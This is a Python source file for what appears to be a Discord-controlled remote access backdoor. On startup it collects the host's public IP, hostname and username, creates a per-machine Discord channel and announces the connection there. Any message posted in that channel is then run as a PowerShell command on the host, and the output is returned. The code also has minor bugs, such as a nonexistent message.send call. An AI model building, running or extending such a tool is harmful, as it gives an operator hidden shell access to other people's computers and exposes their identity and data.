import asyncio
import getpass
import socket
from typing import cast

import discord
import requests
from discord import TextChannel
from discord.ext import commands
from discord.ext.commands import Context

from src.cmd.shell import execute_cmd
from src.constants import UPDATE_TAG, VERSION

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

channel = None
pc_user_name = "Unknown"

bot = commands.Bot(
    command_prefix="z!",
    intents=intents,
)


@bot.event
async def on_ready():
    if not bot.user:
        raise ValueError("Bot user not found.")

    print(f"#- Logged in as {bot.user}!")
    # await bot.tree.sync()
    # print("i- Slash commands synced.")
    print("#- Connected Guilds:")
    for i, guild in enumerate(bot.guilds):
        print(f"[{i + 1}] {guild.name} (ID: {guild.id})")

    global channel
    global pc_user_name

    guild = bot.guilds[0]
    response = await asyncio.to_thread(requests.get, "https://api.ipify.org")
    ip = response.text.replace(".", "-").strip()
    username = getpass.getuser()
    pc_name = socket.gethostname()

    pc_user_name = f"{pc_name.strip()}/{username.strip()}"
    channel_name = f"{pc_user_name.replace('/', '_').lower()}_{ip}"

    channel = next(
        (
            cast(TextChannel, existing_channel)
            for existing_channel in guild.channels
            if existing_channel.name == channel_name
        ),
        None,
    )

    if channel is None:
        channel = await guild.create_text_channel(channel_name)

    connection_msg_string = f"""
======= User **CONNECTED** =======
*Username:* {pc_user_name}
*IP:* {ip.replace("-", ".")}
    """.strip()
    await channel.send(connection_msg_string)


exit_confirmation = False


@bot.event
async def on_message(message: discord.Message):
    if message.author.bot:
        return
    if not channel or message.channel.id != channel.id:
        return

    if not message.content.startswith(bot.command_prefix):
        global exit_confirmation

        if message.content.startswith("exit") and not exit_confirmation:
            exit_confirmation = True
            message.send("*Are you sure you want to exit the process?*")
            return

        exit_confirmation = False
        message.content = f"z!shell {message.content}"

    await bot.process_commands(message)


# ====================
# === PING COMMAND ===
# ====================
@bot.command(name="ping", brief="Check the bot's latency.")
async def ping(ctx: Context, *, args: str | None):
    latency = round(bot.latency * 1000)  # latency in milliseconds

    if args and "-v" in args or "--verbose" in args:
        await ctx.reply(
            f"Pong! 🏓 ({latency / 10}ms)\n**User:** {pc_user_name}\n**Version:** {VERSION}\n**Update Tag:** {UPDATE_TAG}"
        )
    else:
        await ctx.reply(f"Pong! 🏓 ({latency / 10}ms)")


# =========================
# === SHELL COMMAND ===
# =========================
@bot.command(name="shell", brief="Run powershell commands")
async def shell(ctx: Context, *, user_cmd: str | None):
    if not user_cmd:
        await ctx.reply(
            "⚠️ Please enter a command to execute\nUsage: z!shell `<command>`"
        )
        return

    result = execute_cmd(user_cmd) or f'Executed "{user_cmd}" with no output'
    await ctx.reply(result)
